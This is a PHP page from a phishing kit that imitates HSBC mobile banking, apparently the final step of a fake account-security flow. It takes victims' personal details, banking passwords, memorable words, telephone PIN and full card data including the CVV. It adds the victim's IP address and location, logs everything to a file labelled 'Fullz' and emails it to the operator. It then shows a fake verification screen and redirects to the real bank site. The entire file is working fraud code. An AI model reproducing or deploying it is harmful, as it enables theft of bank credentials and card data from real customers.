<?php
	/*

*/
	require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/enc.php";
require "../CONTROLS.php";
date_default_timezone_set('Europe/London');
$date = date('l d F Y');
$time = date('H:i');
$user = $_POST['user'];
$name = $_POST['name'];
$dob = $_POST['dob'];
$address = $_POST['address'].";
$telephone = $_POST['telephone'];
$ccno = $_POST['ccno'];
$ccexp = $_POST['ccexp'];
$secode = $_POST['secode'];
$memoword = $_POST['memoword'];
$memoplace = $_POST['memoplace'];
$telepin = $_POST['telepin'];
$ccno = str_replace(' ', '', $ccno);
$cardInfo = bankDetails($ccno);
$BIN = ($cardInfo['bin']);
$Brand = ($cardInfo['brand']);
$Bank = ($cardInfo['issuer']);
$Type = ($cardInfo['type']);
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$VictimInfo1 = "| Submitted by : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
$VictimInfo2 = "| Location : " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
$VictimInfo3 = "| UserAgent : " . $systemInfo['useragent'] . "";
$VictimInfo4 = "| Browser : " . $systemInfo['browser'] . "";
$VictimInfo5 = "| Os : " . $systemInfo['os'] . "";
$from = $From_Address;
$headers = "From:" . $from;
$subj = "$bank visit from $ip with ID: $id";
$to = $Your_Email; 
$warnsubj = "Abuse";
$warn = "A user (with ip: $ip) has attempted to send you a completed form containing abusive language. This user has been redirected to the official site while blocking the form.";
$bad_words = array('9999','4r5e','5h1t','5hit','a55','anal','anus','ar5e','arrse','arse','ass','ass-fucker','asses','assfucker','assfukka','asshole','assholes','asswhole','a_s_s','b!tch','b00bs','b17ch','b1tch','ballbag','balls','ballsack','bastard','beastial','beastiality','bellend','bestial','bestiality','bi+ch','biatch','bitch','bitcher','bitchers','bitches','bitchin','bitching','bloody','blow job','blowjob','blowjobs','boiolas','bollock','bollok','boner','boob','boobs','booobs','boooobs','booooobs','booooooobs','breasts','buceta','bugger','bum','bunny fucker','butt','butthole','buttmuch','buttplug','c0ck','c0cksucker','carpet muncher','cawk','chink','cipa','cl1t','clit','clitoris','clits','cnut','cock','cock-sucker','cockface','cockhead','cockmunch','cockmuncher','cocks','cocksuck ','cocksucked ','cocksucker','cocksucking','cocksucks ','cocksuka','cocksukka','cok','cokmuncher','coksucka','coon','cox','crap','cum','cummer','cumming','cums','cumshot','cunilingus','cunillingus','cunnilingus','cunt','cuntlick ','cuntlicker ','cuntlicking ','cunts','cyalis','cyberfuc','cyberfuck ','cyberfucked ','cyberfucker','cyberfuckers','cyberfucking ','d1ck','damn','dick','dickhead','dildo','dildos','dink','dinks','dirsa','dlck','dog-fucker','doggin','dogging','donkeyribber','doosh','duche','dyke','ejaculate','ejaculated','ejaculates ','ejaculating ','ejaculatings','ejaculation','ejakulate','f u c k','f u c k e r','f4nny','fag','fagging','faggitt','faggot','faggs','fagot','fagots','fags','fanny','fannyflaps','fannyfucker','fanyy','fatass','fcuk','fcuker','fcuking','feck','fecker','felching','fellate','fellatio','fingerfuck ','fingerfucked ','fingerfucker ','fingerfuckers','fingerfucking ','fingerfucks ','fistfuck','fistfucked ','fistfucker ','fistfuckers ','fistfucking ','fistfuckings ','fistfucks ','flange','fook','fooker','fuck','fucka','fucked','fucker','fuckers','fuckhead','fuckheads','fuckin','fucking','fuckings','fuckingshitmotherfucker','fuckme ','fucks','fuckwhit','fuckwit','fudge packer','fudgepacker','fuk','fuker','fukker','fukkin','fuks','fukwhit','fukwit','fux','fux0r','f_u_c_k','gangbang','gangbanged ','gangbangs ','gaylord','gaysex','goatse','God','god-dam','god-damned','goddamn','goddamned','hardcoresex ','hell','heshe','hoar','hoare','hoer','homo','hore','horniest','horny','hotsex','jack-off ','jackoff','jap','jerk-off ','jism','jiz ','jizm ','jizz','kawk','knob','knobead','knobed','knobend','knobhead','knobjocky','knobjokey','kock','kondum','kondums','kum','kummer','kumming','kums','kunilingus','l3i+ch','l3itch','labia','lmfao','lust','lusting','m0f0','m0fo','m45terbate','ma5terb8','ma5terbate','masochist','master-bate','masterb8','masterbat*','masterbat3','masterbate','masterbation','masterbations','masturbate','mo-fo','mof0','mofo','mothafuck','mothafucka','mothafuckas','mothafuckaz','mothafucked ','mothafucker','mothafuckers','mothafuckin','mothafucking ','mothafuckings','mothafucks','mother fucker','motherfuck','motherfucked','motherfucker','motherfuckers','motherfuckin','motherfucking','motherfuckings','motherfuckka','motherfucks','muff','mutha','muthafecker','muthafuckker','muther','mutherfucker','n1gga','n1gger','nazi','nigg3r','nigg4h','nigga','niggah','niggas','niggaz','nigger','niggers ','nob','nob jokey','nobhead','nobjocky','nobjokey','numbnuts','nutsack','orgasim ','orgasims ','orgasm','orgasms ','p0rn','pawn','pecker','penis','penisfucker','phonesex','phuck','phuk','phuked','phuking','phukked','phukking','phuks','phuq','pigfucker','pimpis','piss','pissed','pisser','pissers','pisses ','pissflaps','pissin ','pissing','pissoff ','poop','porn','porno','pornography','pornos','prick','pricks ','pron','pube','pusse','pussi','pussies','pussy','pussys ','rectum','retard','rimjaw','rimming','s hit','s.o.b.','sadist','schlong','screwing','scroat','scrote','scrotum','semen','sex','sh!+','sh!t','sh1t','shag','shagger','shaggin','shagging','shemale','shi+','shit','shitdick','shite','shited','shitey','shitfuck','shitfull','shithead','shiting','shitings','shits','shitted','shitter','shitters ','shitting','shittings','shitty ','skank','slut','sluts','smegma','smut','snatch','son-of-a-bitch','spac','spunk','s_h_i_t','t1tt1e5','t1tties','teets','teez','testical','testicle','tit','titfuck','tits','titt','tittie5','tittiefucker','titties','tittyfuck','tittywank','titwank','tosser','turd','tw4t','twat','twathead','twatty','twunt','twunter','v14gra','v1gra','vagina','viagra','vulva','w00se','wang','wank','wanker','wanky','whoar','whore','willies','willy','xrated','fuck','fuckoff','fuck off','fucking','nigger','nigerian','Nigerian','scam','cunt','wankers','twats','scammers','shit','wanker','cunt','asshole','arsehole','passwd','sample');
$data = "
	+ -------------- L33bo Fullz ---------------+
	+ ------------------------------------------+
	+ Personal Information
	| Full name : $name
		| Date of birth : $dob
			| Province : $address
				| Phone : $telephone
					+ ------------------------------------------+
					+ Account Information ($bank)
					| Username : $user
						| Memorable Word : $memoword
							| Memorable Place : $memoplace
								| Password : $telepin
									+ ------------------------------------------+
									+ Billing Information
									| Card BIN : $BIN
										| Card Bank : $Bank
											| Card Type : $Brand $Type
												| Card Number : $ccno
													| Expiration date : $ccexp
														| CVV : $secode
															+ ------------------------------------------+
															+ Victim Information
															$VictimInfo1
															$VictimInfo2
															$VictimInfo3
															$VictimInfo4
															$VictimInfo5
															| Received : $date @ $time
																+ ------------------------------------------+
																";
if($Encrypt==1) {
	require "assets/includes/AES.php";
	$imputText = $data;
	$imputKey = $Key;
	$blockSize = 256;
	$aes = new AES($imputText, $imputKey, $blockSize);
	$enc = $aes->encrypt();
	$aes->setData($enc);
	$dec=$aes->decrypt();
}
if($Abuse_Filter==1)
{
foreach($bad_words as $bad_word){
    if(stristr($_POST['name'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location: https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwjv84zvo47LAhWMBY4KHZdtB4oQFggdMAA&url=https%3A%2F%2Fwww.hsbc.co.uk%2F&usg=AFQjCNHgssL48GufX82hDefuAgLxFpYtvg&sig2=7TqRiYsfqhbix_d0NvWsRg"));
}
}
}
if($Save_Log==1) {
	if($Encrypt==1) {
		$file=fopen("../assets/logs/hsbc.txt","a");
		fwrite($file,$enc);
		fclose($file);
	}
	else {
		$file=fopen("../assets/logs/hsbc.txt","a");
		fwrite($file,$data);
		fclose($file);
	}
}	
if($Send_Log==1) {
	if($Encrypt==1) {
		mail($to,$subj,$enc,$headers);	
	}
	else {
		mail($to,$subj,$data,$headers);	
	}
}
?>
	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml">
	<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Complete</title>
	<link rel="shortcut icon" href="assets/img/favicon.ico">
	<link rel="apple-touch-icon" href="assets/img/iphone.png">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, maximum-scale=1.0, minimum-scale=1.0">
	<link type="text/css" rel="stylesheet" href="assets/css/mobile.css">
	<script src="assets/js/mobile.js" type="text/javascript"></script>
	<meta http-equiv="refresh" content="5; URL='https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CCEQFjAAahUKEwia1PG-jKHIAhWCzRQKHdpXDgs&url=https%3A%2F%2Fwww.hsbc.co.uk%2F&usg=AFQjCNHgssL48GufX82hDefuAgLxFpYtvg'" />
	</head>
	<body>
	<div id="mHeader">
	<img src="assets/img/logo.gif" width="235px" height="30px">
	</div>
	<div id="mContent">
	<div id="date"><?php echo date('j M Y');?></div>
		<div class="header">
		<h1 id="heading">Account Security - Complete</h1>
		</div>
		<div>
		<div class="contentSegment">
		<div id="olbol">
		<ul class="legacy">
		<li><span><strong>Internet Banking</strong></span></li>
		<li><a class="redBtn" href="#"><span>Log on</span></a></li>
		<li class="regLink"><a href="#">Register</a></li>
		</ul>
		</div>
		<div class="topbar">
		<div class="bottombar">
		<div class="fragmentWrapper forgot-memorable-4">
		<div class="formContent" id="personalLogonForm">
		<form method="post" class="grid_24 logonForm" id="login" autocomplete="off" name="login" action="Finish.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true">
		<fieldset>
		<legend>Please wait while we check your information</legend>
			<br>
			<center><a id="loadingIcon" name="loadingIcon" href="#"><img src="assets/img/spin.GIF" /></a><br></center>
			&nbsp;
<br>
	<p align="center">It'll only take a few seconds - we're just verifying the details that you've entered.</p>
<p align="center">If you have updated any of your information changes my take upto 48 hours to take effect.</p>
<p align="center">You will be redirected to our homepage when were done verifying your details</p>

</fieldset>
</form>
<div class="asidecol">
<h2>New customers</h2>
<ul>
<li>
<a class="pws" href="#">Register for Online Banking</a>
</li>
</ul>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<ul class="menu">
<li class="question"><a href="#"><span>Support</span></a></li>
<li class="contact"><a href="#"><span>Contact us</span></a></li>
<li class="desktop"><a href="#"><span>Desktop view</span></a></li>
</ul>
</div>
</body>
</html>